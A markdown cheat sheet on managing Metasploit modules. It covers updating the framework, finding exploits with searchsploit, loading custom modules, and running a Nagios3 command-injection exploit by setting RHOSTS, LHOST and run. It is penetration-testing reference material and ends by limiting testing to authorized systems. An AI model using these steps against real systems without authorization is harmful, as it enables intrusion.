

## Update Framework

```
msfupdate
```

- Pulls latest modules/features from the Metasploit Framework repo.
    

---

# Install One Module Without Full Upgrade

## Quick Path

1. Download the `.rb` module you need (e.g., from ExploitDB).
    
2. Place it in your module tree. Prefer the user tree:
    

```
~/.msf4/modules/
```

(mirror the correct subfolders: exploits/auxiliary/post/…)  
3) Load in msfconsole:

```
msfconsole -q
loadpath ~/.msf4/modules/
reload_all
```

---

# Finding Modules (ExploitDB / searchsploit)

## ExploitDB Web

- Filter by Type, Platform, Author, Port, Tag: “Metasploit Framework (MSF)”.
    

## CLI: searchsploit

```
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"
```

- Look for `.rb` entries (Metasploit-ready).
    
- If `msf6 > search <keyword>` doesn’t show it, it’s not in your current Framework or your install is stale.
    

---

# Install Custom Modules

## Paths

- System modules:
    

```
/usr/share/metasploit-framework/modules/
```

- User modules (recommended):
    

```
~/.msf4/modules/
```

## Naming

- Snake case, alnum + underscores:
    

```
nagios3_command_injection.rb
```

## Place and Load

Example (system path shown; user path equivalent is preferred):

```
cp ~/Downloads/9861.rb \
/usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

msfconsole -q
loadpath /usr/share/metasploit-framework/modules/
reload_all
use exploit/unix/webapp/nagios3_command_injection
show options
```

Tip (user path):

```
mkdir -p ~/.msf4/modules/exploits/unix/webapp
cp ~/Downloads/9861.rb \
~/.msf4/modules/exploits/unix/webapp/nagios3_command_injection.rb

msfconsole -q
loadpath ~/.msf4/modules/
reload_all
```

---

# msfconsole Dev Loop (Verify/Run)

```
search nagios
use exploit/unix/webapp/nagios3_command_injection
show options
set RHOSTS <target>
set TARGETURI /
set LHOST <your_ip>
run
```

---

# Troubleshooting

- Module not found:
    
    - `reload_all`, then `info -d` (for debug)
        
    - Confirm folder structure and filename
        
    - Run linter: `tools/dev/msftidy.rb <path_to_module>`
        
- Stale framework:
    
    - `msfupdate`
        
    - If packaged install lags, consider using the git Framework checkout or updating OS repo.
        
- Load from arbitrary folder (temporary):
    
    ```
    msf6 > loadpath /path/to/folder
    msf6 > reload_all
    ```
    

---

# Good Practice

- Keep custom modules in `~/.msf4/modules/` under version control.
    
- Add `References`, `DisclosureDate`, `Targets`, `check` method.
    
- Test in a lab; document required options in the module’s `info`.
    
- Only test against systems you are authorized to assess.